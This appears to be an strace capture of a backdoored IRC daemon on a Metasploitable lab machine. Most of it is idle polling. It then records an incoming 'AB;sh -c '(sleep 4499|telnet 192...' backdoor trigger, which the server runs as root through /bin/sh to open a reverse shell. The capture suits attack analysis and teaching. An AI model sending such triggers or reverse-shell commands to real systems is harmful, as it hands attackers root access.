@@ -1,0 +1,1779 @@
+Process 4618 attached - interrupt to quit
+15:02:45.780381 select(1024, [2 3], [], NULL, {0, 50000}) = 0 (Timeout)
+15:02:45.827105 clock_gettime(CLOCK_MONOTONIC, {2491, 290117548}) = 0
+15:02:45.827139 time(NULL)              = 1478462565
+15:02:45.827154 time(NULL)              = 1478462565
+15:02:45.827169 gettimeofday({1478462565, 827174}, NULL) = 0
+15:02:45.827184 select(1024, [2], [], NULL, {0, 0}) = 0 (Timeout)
+15:02:45.827266 clock_gettime(CLOCK_MONOTONIC, {2491, 290263645}) = 0
+15:02:45.827280 gettimeofday({1478462565, 827284}, NULL) = 0
+15:02:45.827293 select(1024, [2 3], [], NULL, {1, 0}) = 0 (Timeout)
+15:02:46.827098 clock_gettime(CLOCK_MONOTONIC, {2492, 290109433}) = 0
+15:02:46.827133 gettimeofday({1478462566, 827138}, NULL) = 0
+15:02:46.827149 select(1024, [2 3], [], NULL, {1, 0}) = 0 (Timeout)
+15:02:47.827099 clock_gettime(CLOCK_MONOTONIC, {2493, 290108614}) = 0
+15:02:47.827131 time(NULL)              = 1478462567
+15:02:47.827143 time(NULL)              = 1478462567
+15:02:47.827163 gettimeofday({1478462567, 827169}, NULL) = 0
+15:02:47.827179 select(1024, [2], [], NULL, {0, 0}) = 0 (Timeout)
+15:02:47.827261 clock_gettime(CLOCK_MONOTONIC, {2493, 290258518}) = 0
+15:02:47.827275 gettimeofday({1478462567, 827279}, NULL) = 0
+15:02:47.827288 select(1024, [2 3], [], NULL, {1, 0}) = 0 (Timeout)
+15:02:48.827097 clock_gettime(CLOCK_MONOTONIC, {2494, 290108295}) = 0
+15:02:48.827132 gettimeofday({1478462568, 827138}, NULL) = 0
+15:02:48.827149 select(1024, [2 3], [], NULL, {1, 0}) = 0 (Timeout)
+15:02:49.827062 clock_gettime(CLOCK_MONOTONIC, {2495, 290072888}) = 0
+15:02:49.827095 time(NULL)              = 1478462569
+15:02:49.827108 time(NULL)              = 1478462569
+15:02:49.827123 gettimeofday({1478462569, 827128}, NULL) = 0
+15:02:49.827138 select(1024, [2], [], NULL, {0, 0}) = 0 (Timeout)
+15:02:49.827219 clock_gettime(CLOCK_MONOTONIC, {2495, 290217137}) = 0
+15:02:49.827233 gettimeofday({1478462569, 827238}, NULL) = 0
+15:02:49.827247 select(1024, [2 3], [], NULL, {1, 0}) = 0 (Timeout)
+15:02:50.827855 clock_gettime(CLOCK_MONOTONIC, {2496, 290864768}) = 0
+15:02:50.827889 gettimeofday({1478462570, 827894}, NULL) = 0
+15:02:50.827905 select(1024, [2 3], [], NULL, {1, 0}) = 0 (Timeout)
+15:02:51.827099 clock_gettime(CLOCK_MONOTONIC, {2497, 290109759}) = 0
+15:02:51.827131 time(NULL)              = 1478462571
+15:02:51.827144 time(NULL)              = 1478462571
+15:02:51.827159 gettimeofday({1478462571, 827164}, NULL) = 0
+15:02:51.827174 select(1024, [2], [], NULL, {0, 0}) = 0 (Timeout)
+15:02:51.827256 clock_gettime(CLOCK_MONOTONIC, {2497, 290253192}) = 0
+15:02:51.827269 gettimeofday({1478462571, 827274}, NULL) = 0
+15:02:51.827283 select(1024, [2 3], [], NULL, {1, 0}) = 0 (Timeout)
+15:02:52.827303 clock_gettime(CLOCK_MONOTONIC, {2498, 290313248}) = 0
+15:02:52.827338 gettimeofday({1478462572, 827343}, NULL) = 0
+15:02:52.827354 select(1024, [2 3], [], NULL, {1, 0}) = 0 (Timeout)
+15:02:53.827098 clock_gettime(CLOCK_MONOTONIC, {2499, 290107978}) = 0
+15:02:53.827129 time(NULL)              = 1478462573
+15:02:53.827142 time(NULL)              = 1478462573
+15:02:53.827162 gettimeofday({1478462573, 827167}, NULL) = 0
+15:02:53.827178 select(1024, [2], [], NULL, {0, 0}) = 0 (Timeout)
+15:02:53.827259 clock_gettime(CLOCK_MONOTONIC, {2499, 290256651}) = 0
+15:02:53.827273 gettimeofday({1478462573, 827277}, NULL) = 0
+15:02:53.827286 select(1024, [2 3], [], NULL, {1, 0}) = 0 (Timeout)
+15:02:54.827098 clock_gettime(CLOCK_MONOTONIC, {2500, 290108370}) = 0
+15:02:54.827132 gettimeofday({1478462574, 827137}, NULL) = 0
+15:02:54.827148 select(1024, [2 3], [], NULL, {1, 0}) = 0 (Timeout)
+15:02:55.827087 clock_gettime(CLOCK_MONOTONIC, {2501, 290096243}) = 0
+15:02:55.827117 time(NULL)              = 1478462575
+15:02:55.827128 time(NULL)              = 1478462575
+15:02:55.827142 gettimeofday({1478462575, 827147}, NULL) = 0
+15:02:55.827156 select(1024, [2], [], NULL, {0, 0}) = 0 (Timeout)
+15:02:55.827228 clock_gettime(CLOCK_MONOTONIC, {2501, 290225060}) = 0
+15:02:55.827240 gettimeofday({1478462575, 827244}, NULL) = 0
+15:02:55.827252 select(1024, [2 3], [], NULL, {1, 0}) = 0 (Timeout)
+15:02:56.827080 clock_gettime(CLOCK_MONOTONIC, {2502, 290089131}) = 0
+15:02:56.827112 gettimeofday({1478462576, 827117}, NULL) = 0
+15:02:56.827126 select(1024, [2 3], [], NULL, {1, 0}) = 1 (in [2], left {0, 910000})
+15:02:56.920125 clock_gettime(CLOCK_MONOTONIC, {2502, 383133696}) = 0
+15:02:56.920152 time(NULL)              = 1478462576
+15:02:56.920165 time(NULL)              = 1478462576
+15:02:56.920180 gettimeofday({1478462576, 920185}, NULL) = 0
+15:02:56.920195 select(1024, [2], [], NULL, {0, 0}) = 1 (in [2], left {0, 0})
+15:02:56.920312 clock_gettime(CLOCK_MONOTONIC, {2502, 383309077}) = 0
+15:02:56.920325 gettimeofday({1478462576, 920330}, NULL) = 0
+15:02:56.920339 select(1024, [2 3], [], NULL, {1, 0}) = 1 (in [2], left {1, 0})
+15:02:56.920461 clock_gettime(CLOCK_MONOTONIC, {2502, 383458495}) = 0
+15:02:56.920478 accept(2, 0, NULL)      = 4
+15:02:56.920504 getpeername(4, {sa_family=AF_INET, sin_port=htons(46871), sin_addr=inet_addr("192.168.56.1")}, [16]) = 0
+15:02:56.920564 fcntl64(4, F_GETFL)     = 0x2 (flags O_RDWR)
+15:02:56.920581 fcntl64(4, F_SETFL, O_RDWR|O_NONBLOCK) = 0
+15:02:56.920601 setsockopt(4, SOL_SOCKET, SO_REUSEADDR, [1], 4) = 0
+15:02:56.920620 setsockopt(4, SOL_SOCKET, SO_RCVBUF, [8192], 4) = 0
+15:02:56.920637 setsockopt(4, SOL_SOCKET, SO_SNDBUF, [8192], 4) = 0
+15:02:56.920654 getsockopt(4, SOL_IP, IP_OPTIONS, "", [0]) = 0
+15:02:56.920673 setsockopt(4, SOL_IP, IP_OPTIONS, NULL, 0) = 0
+15:02:56.920693 clock_gettime(CLOCK_MONOTONIC, {2502, 383691125}) = 0
+15:02:56.920710 socket(PF_INET, SOCK_DGRAM, IPPROTO_IP) = 5
+15:02:56.920725 fcntl64(5, F_GETFL)     = 0x2 (flags O_RDWR)
+15:02:56.920736 fcntl64(5, F_SETFL, O_RDWR|O_NONBLOCK) = 0
+15:02:56.920746 fcntl64(5, F_SETFD, FD_CLOEXEC) = 0
+15:02:56.920760 connect(5, {sa_family=AF_INET, sin_port=htons(53), sin_addr=inet_addr("10.0.2.3")}, 16) = -1 ENETUNREACH (Network is unreachable)
+15:02:56.920791 close(5)                = 0
+15:02:56.920808 socket(PF_INET, SOCK_DGRAM, IPPROTO_IP) = 5
+15:02:56.920820 fcntl64(5, F_GETFL)     = 0x2 (flags O_RDWR)
+15:02:56.920831 fcntl64(5, F_SETFL, O_RDWR|O_NONBLOCK) = 0
+15:02:56.920841 fcntl64(5, F_SETFD, FD_CLOEXEC) = 0
+15:02:56.920854 connect(5, {sa_family=AF_INET, sin_port=htons(53), sin_addr=inet_addr("10.0.2.3")}, 16) = -1 ENETUNREACH (Network is unreachable)
+15:02:56.920871 close(5)                = 0
+15:02:56.920888 accept(2, 0, NULL)      = -1 EAGAIN (Resource temporarily unavailable)
+15:02:56.920903 gettimeofday({1478462576, 920908}, NULL) = 0
+15:02:56.920917 select(1024, [2 3], [], NULL, {1, 0}) = 0 (Timeout)
+15:02:57.917098 clock_gettime(CLOCK_MONOTONIC, {2503, 380108402}) = 0
+15:02:57.917135 send(4, ":irc.Metasploitable.LAN NOTICE A"..., 174, 0) = 174
+15:02:57.917258 time(NULL)              = 1478462577
+15:02:57.917272 time(NULL)              = 1478462577
+15:02:57.917288 gettimeofday({1478462577, 917292}, NULL) = 0
+15:02:57.917304 select(1024, [2], [], NULL, {0, 0}) = 0 (Timeout)
+15:02:57.917386 clock_gettime(CLOCK_MONOTONIC, {2503, 380383096}) = 0
+15:02:57.917399 gettimeofday({1478462577, 917404}, NULL) = 0
+15:02:57.917413 select(1024, [2 3], [], NULL, {1, 0}) = 0 (Timeout)
+15:02:58.917097 clock_gettime(CLOCK_MONOTONIC, {2504, 380106887}) = 0
+15:02:58.917130 gettimeofday({1478462578, 917135}, NULL) = 0
+15:02:58.917146 select(1024, [2 3], [], NULL, {1, 0}) = 0 (Timeout)
+15:02:59.917097 clock_gettime(CLOCK_MONOTONIC, {2505, 380107382}) = 0
+15:02:59.917129 time(NULL)              = 1478462579
+15:02:59.917141 time(NULL)              = 1478462579
+15:02:59.917162 gettimeofday({1478462579, 917167}, NULL) = 0
+15:02:59.917178 select(1024, [2], [], NULL, {0, 0}) = 0 (Timeout)
+15:02:59.917259 clock_gettime(CLOCK_MONOTONIC, {2505, 380256649}) = 0
+15:02:59.917273 gettimeofday({1478462579, 917277}, NULL) = 0
+15:02:59.917286 select(1024, [2 3], [], NULL, {1, 0}) = 0 (Timeout)
+15:03:00.917097 clock_gettime(CLOCK_MONOTONIC, {2506, 380107657}) = 0
+15:03:00.917132 gettimeofday({1478462580, 917137}, NULL) = 0
+15:03:00.917148 select(1024, [2 3], [], NULL, {1, 0}) = 0 (Timeout)
+15:03:01.917105 clock_gettime(CLOCK_MONOTONIC, {2507, 380114999}) = 0
+15:03:01.917137 time(NULL)              = 1478462581
+15:03:01.917149 time(NULL)              = 1478462581
+15:03:01.917165 gettimeofday({1478462581, 917170}, NULL) = 0
+15:03:01.917180 select(1024, [2], [], NULL, {0, 0}) = 0 (Timeout)
+15:03:01.917262 clock_gettime(CLOCK_MONOTONIC, {2507, 380259113}) = 0
+15:03:01.917275 gettimeofday({1478462581, 917279}, NULL) = 0
+15:03:01.917289 select(1024, [2 3], [], NULL, {1, 0}) = 0 (Timeout)
+15:03:02.917106 clock_gettime(CLOCK_MONOTONIC, {2508, 380115558}) = 0
+15:03:02.917139 gettimeofday({1478462582, 917144}, NULL) = 0
+15:03:02.917155 select(1024, [2 3], [], NULL, {1, 0}) = 0 (Timeout)
+15:03:03.917902 clock_gettime(CLOCK_MONOTONIC, {2509, 380912431}) = 0
+15:03:03.917934 time(NULL)              = 1478462583
+15:03:03.917947 time(NULL)              = 1478462583
+15:03:03.917962 gettimeofday({1478462583, 917967}, NULL) = 0
+15:03:03.917977 select(1024, [2], [], NULL, {0, 0}) = 0 (Timeout)
+15:03:03.918058 clock_gettime(CLOCK_MONOTONIC, {2509, 381055636}) = 0
+15:03:03.918072 gettimeofday({1478462583, 918076}, NULL) = 0
+15:03:03.918085 select(1024, [2 3], [], NULL, {1, 0}) = 0 (Timeout)
+15:03:04.917100 clock_gettime(CLOCK_MONOTONIC, {2510, 380110972}) = 0
+15:03:04.917135 gettimeofday({1478462584, 917141}, NULL) = 0
+15:03:04.917151 select(1024, [2 3], [], NULL, {1, 0}) = 0 (Timeout)
+15:03:05.917096 clock_gettime(CLOCK_MONOTONIC, {2511, 380106054}) = 0
+15:03:05.917127 time(NULL)              = 1478462585
+15:03:05.917140 time(NULL)              = 1478462585
+15:03:05.917160 gettimeofday({1478462585, 917165}, NULL) = 0
+15:03:05.917175 select(1024, [2], [], NULL, {0, 0}) = 0 (Timeout)
+15:03:05.917256 clock_gettime(CLOCK_MONOTONIC, {2511, 380253576}) = 0
+15:03:05.917270 gettimeofday({1478462585, 917274}, NULL) = 0
+15:03:05.917283 select(1024, [2 3], [], NULL, {1, 0}) = 0 (Timeout)
+15:03:06.917879 clock_gettime(CLOCK_MONOTONIC, {2512, 380889715}) = 0
+15:03:06.917914 gettimeofday({1478462586, 917919}, NULL) = 0
+15:03:06.917930 select(1024, [2 3], [], NULL, {1, 0}) = 0 (Timeout)
+15:03:07.917099 clock_gettime(CLOCK_MONOTONIC, {2513, 380108495}) = 0
+15:03:07.917131 time(NULL)              = 1478462587
+15:03:07.917144 time(NULL)              = 1478462587
+15:03:07.917166 gettimeofday({1478462587, 917171}, NULL) = 0
+15:03:07.917181 select(1024, [2], [], NULL, {0, 0}) = 0 (Timeout)
+15:03:07.917263 clock_gettime(CLOCK_MONOTONIC, {2513, 380260206}) = 0
+15:03:07.917276 gettimeofday({1478462587, 917281}, NULL) = 0
+15:03:07.917290 select(1024, [2 3], [], NULL, {1, 0}) = 0 (Timeout)
+15:03:08.917098 clock_gettime(CLOCK_MONOTONIC, {2514, 380107834}) = 0
+15:03:08.917131 gettimeofday({1478462588, 917136}, NULL) = 0
+15:03:08.917148 select(1024, [2 3], [], NULL, {1, 0}) = 0 (Timeout)
+15:03:09.917097 clock_gettime(CLOCK_MONOTONIC, {2515, 380107196}) = 0
+15:03:09.917129 time(NULL)              = 1478462589
+15:03:09.917142 time(NULL)              = 1478462589
+15:03:09.917157 gettimeofday({1478462589, 917162}, NULL) = 0
+15:03:09.917172 select(1024, [2], [], NULL, {0, 0}) = 0 (Timeout)
+15:03:09.917253 clock_gettime(CLOCK_MONOTONIC, {2515, 380250809}) = 0
+15:03:09.917267 gettimeofday({1478462589, 917271}, NULL) = 0
+15:03:09.917280 select(1024, [2 3], [], NULL, {1, 0}) = 0 (Timeout)
+15:03:10.917101 clock_gettime(CLOCK_MONOTONIC, {2516, 380110747}) = 0
+15:03:10.917134 gettimeofday({1478462590, 917139}, NULL) = 0
+15:03:10.917150 select(1024, [2 3], [], NULL, {1, 0}) = 0 (Timeout)
+15:03:11.917096 clock_gettime(CLOCK_MONOTONIC, {2517, 380106350}) = 0
+15:03:11.917128 time(NULL)              = 1478462591
+15:03:11.917141 time(NULL)              = 1478462591
+15:03:11.917161 gettimeofday({1478462591, 917166}, NULL) = 0
+15:03:11.917176 select(1024, [2], [], NULL, {0, 0}) = 0 (Timeout)
+15:03:11.917257 clock_gettime(CLOCK_MONOTONIC, {2517, 380254460}) = 0
+15:03:11.917270 gettimeofday({1478462591, 917275}, NULL) = 0
+15:03:11.917284 select(1024, [2 3], [], NULL, {1, 0}) = 0 (Timeout)
+15:03:12.917862 clock_gettime(CLOCK_MONOTONIC, {2518, 380871470}) = 0
+15:03:12.917895 gettimeofday({1478462592, 917900}, NULL) = 0
+15:03:12.917911 select(1024, [2 3], [], NULL, {1, 0}) = 0 (Timeout)
+15:03:13.917100 clock_gettime(CLOCK_MONOTONIC, {2519, 380109543}) = 0
+15:03:13.917131 time(NULL)              = 1478462593
+15:03:13.917144 time(NULL)              = 1478462593
+15:03:13.917159 gettimeofday({1478462593, 917164}, NULL) = 0
+15:03:13.917174 select(1024, [2], [], NULL, {0, 0}) = 0 (Timeout)
+15:03:13.917255 clock_gettime(CLOCK_MONOTONIC, {2519, 380252679}) = 0
+15:03:13.917269 gettimeofday({1478462593, 917273}, NULL) = 0
+15:03:13.917282 select(1024, [2 3], [], NULL, {1, 0}) = 0 (Timeout)
+15:03:14.917099 clock_gettime(CLOCK_MONOTONIC, {2520, 380109023}) = 0
+15:03:14.917133 gettimeofday({1478462594, 917138}, NULL) = 0
+15:03:14.917149 select(1024, [2 3], [], NULL, {1, 0}) = 0 (Timeout)
+15:03:15.917102 clock_gettime(CLOCK_MONOTONIC, {2521, 380112127}) = 0
+15:03:15.917133 time(NULL)              = 1478462595
+15:03:15.917146 time(NULL)              = 1478462595
+15:03:15.917161 gettimeofday({1478462595, 917166}, NULL) = 0
+15:03:15.917176 select(1024, [2], [], NULL, {0, 0}) = 0 (Timeout)
+15:03:15.917257 clock_gettime(CLOCK_MONOTONIC, {2521, 380255069}) = 0
+15:03:15.917271 gettimeofday({1478462595, 917275}, NULL) = 0
+15:03:15.917285 select(1024, [2 3], [], NULL, {1, 0}) = 0 (Timeout)
+15:03:16.917097 clock_gettime(CLOCK_MONOTONIC, {2522, 380107428}) = 0
+15:03:16.917131 gettimeofday({1478462596, 917136}, NULL) = 0
+15:03:16.917147 select(1024, [2 3], [], NULL, {1, 0}) = 0 (Timeout)
+15:03:17.917098 clock_gettime(CLOCK_MONOTONIC, {2523, 380108190}) = 0
+15:03:17.917130 time(NULL)              = 1478462597
+15:03:17.917144 time(NULL)              = 1478462597
+15:03:17.917164 gettimeofday({1478462597, 917169}, NULL) = 0
+15:03:17.917179 select(1024, [2], [], NULL, {0, 0}) = 0 (Timeout)
+15:03:17.917260 clock_gettime(CLOCK_MONOTONIC, {2523, 380257548}) = 0
+15:03:17.917274 gettimeofday({1478462597, 917278}, NULL) = 0
+15:03:17.917287 select(1024, [2 3], [], NULL, {1, 0}) = 0 (Timeout)
+15:03:18.917098 clock_gettime(CLOCK_MONOTONIC, {2524, 380108230}) = 0
+15:03:18.917131 gettimeofday({1478462598, 917136}, NULL) = 0
+15:03:18.917147 select(1024, [2 3], [], NULL, {1, 0}) = 0 (Timeout)
+15:03:19.917059 clock_gettime(CLOCK_MONOTONIC, {2525, 380069821}) = 0
+15:03:19.917092 time(NULL)              = 1478462599
+15:03:19.917104 time(NULL)              = 1478462599
+15:03:19.917120 gettimeofday({1478462599, 917124}, NULL) = 0
+15:03:19.917135 select(1024, [2], [], NULL, {0, 0}) = 0 (Timeout)
+15:03:19.917216 clock_gettime(CLOCK_MONOTONIC, {2525, 380213141}) = 0
+15:03:19.917229 gettimeofday({1478462599, 917234}, NULL) = 0
+15:03:19.917243 select(1024, [2 3], [], NULL, {1, 0}) = 0 (Timeout)
+15:03:20.917100 clock_gettime(CLOCK_MONOTONIC, {2526, 380110192}) = 0
+15:03:20.917135 gettimeofday({1478462600, 917140}, NULL) = 0
+15:03:20.917151 select(1024, [2 3], [], NULL, {1, 0}) = 0 (Timeout)
+15:03:21.917098 clock_gettime(CLOCK_MONOTONIC, {2527, 380107928}) = 0
+15:03:21.917130 time(NULL)              = 1478462601
+15:03:21.917143 time(NULL)              = 1478462601
+15:03:21.917158 gettimeofday({1478462601, 917163}, NULL) = 0
+15:03:21.917173 select(1024, [2], [], NULL, {0, 0}) = 0 (Timeout)
+15:03:21.917254 clock_gettime(CLOCK_MONOTONIC, {2527, 380252000}) = 0
+15:03:21.917268 gettimeofday({1478462601, 917273}, NULL) = 0
+15:03:21.917282 select(1024, [2 3], [], NULL, {1, 0}) = 0 (Timeout)
+15:03:22.917100 clock_gettime(CLOCK_MONOTONIC, {2528, 380109800}) = 0
+15:03:22.917134 gettimeofday({1478462602, 917140}, NULL) = 0
+15:03:22.917150 select(1024, [2 3], [], NULL, {1, 0}) = 0 (Timeout)
+15:03:23.917099 clock_gettime(CLOCK_MONOTONIC, {2529, 380108996}) = 0
+15:03:23.917131 time(NULL)              = 1478462603
+15:03:23.917143 time(NULL)              = 1478462603
+15:03:23.917164 gettimeofday({1478462603, 917169}, NULL) = 0
+15:03:23.917179 select(1024, [2], [], NULL, {0, 0}) = 0 (Timeout)
+15:03:23.917260 clock_gettime(CLOCK_MONOTONIC, {2529, 380258052}) = 0
+15:03:23.917274 gettimeofday({1478462603, 917278}, NULL) = 0
+15:03:23.917288 select(1024, [2 3], [], NULL, {1, 0}) = 0 (Timeout)
+15:03:24.917098 clock_gettime(CLOCK_MONOTONIC, {2530, 380108719}) = 0
+15:03:24.917133 gettimeofday({1478462604, 917138}, NULL) = 0
+15:03:24.917149 select(1024, [2 3], [], NULL, {1, 0}) = 0 (Timeout)
+15:03:25.917098 clock_gettime(CLOCK_MONOTONIC, {2531, 380109063}) = 0
+15:03:25.917132 time(NULL)              = 1478462605
+15:03:25.917144 time(NULL)              = 1478462605
+15:03:25.917160 gettimeofday({1478462605, 917165}, NULL) = 0
+15:03:25.917175 select(1024, [2], [], NULL, {0, 0}) = 0 (Timeout)
+15:03:25.917257 clock_gettime(CLOCK_MONOTONIC, {2531, 380254372}) = 0
+15:03:25.917270 gettimeofday({1478462605, 917275}, NULL) = 0
+15:03:25.917284 select(1024, [2 3], [], NULL, {1, 0}) = 0 (Timeout)
+15:03:26.917078 clock_gettime(CLOCK_MONOTONIC, {2532, 380088625}) = 0
+15:03:26.917112 gettimeofday({1478462606, 917117}, NULL) = 0
+15:03:26.917128 select(1024, [2 3], [], NULL, {1, 0}) = 0 (Timeout)
+15:03:27.917099 clock_gettime(CLOCK_MONOTONIC, {2533, 380109412}) = 0
+15:03:27.917131 time(NULL)              = 1478462607
+15:03:27.917151 send(4, ":irc.Metasploitable.LAN NOTICE A"..., 104, 0) = 104
+15:03:27.917254 time(NULL)              = 1478462607
+15:03:27.917272 gettimeofday({1478462607, 917277}, NULL) = 0
+15:03:27.917288 select(1024, [2], [], NULL, {0, 0}) = 0 (Timeout)
+15:03:27.917369 clock_gettime(CLOCK_MONOTONIC, {2533, 380367045}) = 0
+15:03:27.917383 gettimeofday({1478462607, 917388}, NULL) = 0
+15:03:27.917397 select(1024, [2 3], [], NULL, {1, 0}) = 0 (Timeout)
+15:03:28.917098 clock_gettime(CLOCK_MONOTONIC, {2534, 380108996}) = 0
+15:03:28.917133 gettimeofday({1478462608, 917138}, NULL) = 0
+15:03:28.917149 select(1024, [2 3 4], [], NULL, {1, 0}) = 1 (in [4], left {1, 0})
+15:03:28.917269 clock_gettime(CLOCK_MONOTONIC, {2534, 380266992}) = 0
+15:03:28.917288 recv(4, "AB;sh -c \'(sleep 4499|telnet 192"..., 8192, 0) = 128
+15:03:28.917326 rt_sigaction(SIGINT, {SIG_IGN}, {0x8062280, [HUP INT], 0}, 8) = 0
+15:03:28.917358 rt_sigaction(SIGQUIT, {SIG_IGN}, {SIG_IGN}, 8) = 0
+15:03:28.917380 rt_sigprocmask(SIG_BLOCK, [CHLD], [], 8) = 0
+15:03:28.917402 clone(Process 4967 attached
+child_stack=0, flags=CLONE_PARENT_SETTID|SIGCHLD, parent_tidptr=0xbfbb5864) = 4967
+[pid  4967] 15:03:28.917519 rt_sigaction(SIGINT, {0x8062280, [HUP INT], 0}, NULL, 8) = 0
+[pid  4967] 15:03:28.917538 rt_sigaction(SIGQUIT, {SIG_IGN}, NULL, 8) = 0
+[pid  4967] 15:03:28.917554 rt_sigprocmask(SIG_SETMASK, [], NULL, 8) = 0
+[pid  4967] 15:03:28.917574 execve("/bin/sh", ["sh", "-c", "AB;sh -c \'(sleep 4499|telnet 192"...], [/* 14 vars */]) = 0
+[pid  4967] 15:03:28.917745 brk(0)      = 0x80f9000
+[pid  4967] 15:03:28.917781 access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
+[pid  4967] 15:03:28.917805 mmap2(NULL, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb7fda000
+[pid  4967] 15:03:28.917827 access("/etc/ld.so.preload", R_OK) = -1 ENOENT (No such file or directory)
+[pid  4967] 15:03:28.917856 open("/etc/ld.so.cache", O_RDONLY) = 1
+[pid  4967] 15:03:28.917875 fstat64(1, {st_mode=S_IFREG|0644, st_size=29338, ...}) = 0
+[pid  4967] 15:03:28.917914 mmap2(NULL, 29338, PROT_READ, MAP_PRIVATE, 1, 0) = 0xb7fd2000
+[pid  4967] 15:03:28.917926 close(1)    = 0
+[pid  4967] 15:03:28.917941 access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
+[pid  4967] 15:03:28.917966 open("/lib/libncurses.so.5", O_RDONLY) = 1
+[pid  4967] 15:03:28.917985 read(1, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0\200\220"..., 512) = 512
+[pid  4967] 15:03:28.918014 fstat64(1, {st_mode=S_IFREG|0644, st_size=190584, ...}) = 0
+[pid  4967] 15:03:28.918051 mmap2(NULL, 194420, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 1, 0) = 0xb7fa2000
+[pid  4967] 15:03:28.918066 mmap2(0xb7fcf000, 12288, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 1, 0x2c) = 0xb7fcf000
+[pid  4967] 15:03:28.918089 close(1)    = 0
+[pid  4967] 15:03:28.918104 access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
+[pid  4967] 15:03:28.918125 open("/lib/tls/i686/cmov/libdl.so.2", O_RDONLY) = 1
+[pid  4967] 15:03:28.918147 read(1, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0p\n\0\000"..., 512) = 512
+[pid  4967] 15:03:28.918171 fstat64(1, {st_mode=S_IFREG|0644, st_size=9684, ...}) = 0
+[pid  4967] 15:03:28.918234 mmap2(NULL, 12412, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 1, 0) = 0xb7f9e000
+[pid  4967] 15:03:28.918248 mmap2(0xb7fa0000, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 1, 0x1) = 0xb7fa0000
+[pid  4967] 15:03:28.918270 close(1)    = 0
+[pid  4967] 15:03:28.918283 access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
+[pid  4967] 15:03:28.918302 open("/lib/tls/i686/cmov/libc.so.6", O_RDONLY) = 1
+[pid  4967] 15:03:28.918324 read(1, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0\260e\1"..., 512) = 512
+[pid  4967] 15:03:28.918347 fstat64(1, {st_mode=S_IFREG|0755, st_size=1364388, ...}) = 0
+[pid  4967] 15:03:28.918384 mmap2(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb7f9d000
+[pid  4967] 15:03:28.918401 mmap2(NULL, 1369712, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 1, 0) = 0xb7e4e000
+[pid  4967] 15:03:28.918414 mmap2(0xb7f97000, 12288, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 1, 0x149) = 0xb7f97000
+[pid  4967] 15:03:28.918432 mmap2(0xb7f9a000, 9840, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_ANONYMOUS, -1, 0) = 0xb7f9a000
+[pid  4967] 15:03:28.918450 close(1)    = 0
+[pid  4967] 15:03:28.918480 mmap2(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb7e4d000
+[pid  4967] 15:03:28.918495 set_thread_area({entry_number:-1 -> 6, base_addr:0xb7e4d6b0, limit:1048575, seg_32bit:1, contents:0, read_exec_only:0, limit_in_pages:1, seg_not_present:0, useable:1}) = 0
+[pid  4967] 15:03:28.918594 mprotect(0xb7f97000, 4096, PROT_READ) = 0
+[pid  4967] 15:03:28.918653 munmap(0xb7fd2000, 29338) = 0
+[pid  4967] 15:03:28.918711 rt_sigprocmask(SIG_BLOCK, NULL, [], 8) = 0
+[pid  4967] 15:03:28.918731 open("/dev/tty", O_RDWR|O_NONBLOCK|O_LARGEFILE) = -1 ENXIO (No such device or address)
+[pid  4967] 15:03:28.918759 ioctl(0, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbf8862b0) = -1 ENOTTY (Inappropriate ioctl for device)
+[pid  4967] 15:03:28.918807 brk(0)      = 0x80f9000
+[pid  4967] 15:03:28.918818 brk(0x80fa000) = 0x80fa000
+[pid  4967] 15:03:28.918834 brk(0x80fb000) = 0x80fb000
+[pid  4967] 15:03:28.918858 getuid32()  = 0
+[pid  4967] 15:03:28.918868 getgid32()  = 0
+[pid  4967] 15:03:28.918878 geteuid32() = 0
+[pid  4967] 15:03:28.918888 getegid32() = 0
+[pid  4967] 15:03:28.918906 rt_sigprocmask(SIG_BLOCK, NULL, [], 8) = 0
+[pid  4967] 15:03:28.918924 time(NULL)  = 1478462608
+[pid  4967] 15:03:28.918942 brk(0x80fc000) = 0x80fc000
+[pid  4967] 15:03:28.918961 brk(0x80fd000) = 0x80fd000
+[pid  4967] 15:03:28.918990 open("/proc/meminfo", O_RDONLY) = 1
+[pid  4967] 15:03:28.919021 fstat64(1, {st_mode=S_IFREG|0444, st_size=0, ...}) = 0
+[pid  4967] 15:03:28.919058 mmap2(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb7fd9000
+[pid  4967] 15:03:28.919072 read(1, "MemTotal:      4152252 kB\nMemFre"..., 1024) = 846
+[pid  4967] 15:03:28.919124 close(1)    = 0
+[pid  4967] 15:03:28.919136 munmap(0xb7fd9000, 4096) = 0
+[pid  4967] 15:03:28.919150 brk(0x80fe000) = 0x80fe000
+[pid  4967] 15:03:28.919182 rt_sigaction(SIGCHLD, {SIG_DFL}, {SIG_DFL}, 8) = 0
+[pid  4967] 15:03:28.919204 rt_sigaction(SIGCHLD, {SIG_DFL}, {SIG_DFL}, 8) = 0
+[pid  4967] 15:03:28.919224 rt_sigaction(SIGINT, {SIG_DFL}, {SIG_DFL}, 8) = 0
+[pid  4967] 15:03:28.919244 rt_sigaction(SIGINT, {SIG_DFL}, {SIG_DFL}, 8) = 0
+[pid  4967] 15:03:28.919264 rt_sigaction(SIGQUIT, {SIG_DFL}, {SIG_IGN}, 8) = 0
